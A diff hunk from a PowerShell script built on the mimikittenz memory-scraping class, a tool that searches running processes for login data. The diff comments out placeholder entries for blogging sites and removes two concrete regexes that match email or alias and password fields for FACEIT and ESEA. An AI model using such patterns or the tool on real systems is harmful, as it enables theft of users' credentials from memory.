@@ -506,17 +506,17 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 
 #Blogging Sites
     #WordPress
-    [mimikittenz.MemProcInspector]::AddRegex("WordPress","<regex_here>")
+    #[mimikittenz.MemProcInspector]::AddRegex("WordPress","<regex_here>")
     #Joomla
-    [mimikittenz.MemProcInspector]::AddRegex("Joomla","<regex_here>")
+    #[mimikittenz.MemProcInspector]::AddRegex("Joomla","<regex_here>")
     #Drupal
-    [mimikittenz.MemProcInspector]::AddRegex("Drupal","<regex_here>")
+    #[mimikittenz.MemProcInspector]::AddRegex("Drupal","<regex_here>")
     #Blogger
-    [mimikittenz.MemProcInspector]::AddRegex("Blogger","<regex_here>")
+    #[mimikittenz.MemProcInspector]::AddRegex("Blogger","<regex_here>")
     #Magento
-    [mimikittenz.MemProcInspector]::AddRegex("Magento","<regex_here>")
+    #[mimikittenz.MemProcInspector]::AddRegex("Magento","<regex_here>")
     #Blogg.no
-    [mimikittenz.MemProcInspector]::AddRegex("Blogg.no","<regex_here>")    
+    #[mimikittenz.MemProcInspector]::AddRegex("Blogg.no","<regex_here>")    
 
 #Anti-Forensics
 
@@ -563,11 +563,11 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 #Gaming Related Apps
 
     #Faceit Web
-    #[mimikittenz.MemProcInspector]::AddRegex("FACEIT.com","&email=.{1,99}?&password=.{1,99}")
+    #[mimikittenz.MemProcInspector]::AddRegex("FACEIT.com","<regex_here>")
     #Faceit Anti-Cheat
     #[mimikittenz.MemProcInspector]::AddRegex("FACEIT Client","<regex_here>")
     #ESEA Web
-    #[mimikittenz.MemProcInspector]::AddRegex("PLAY.ESEA.net","alias=.{1,50}&password=.{1,50}")
+    #[mimikittenz.MemProcInspector]::AddRegex("PLAY.ESEA.net","<regex_here>")
     #ESEA Client
     #[mimikittenz.MemProcInspector]::AddRegex("ESEA Client","<regex_here>")
     #Plays.tv Video Recorder
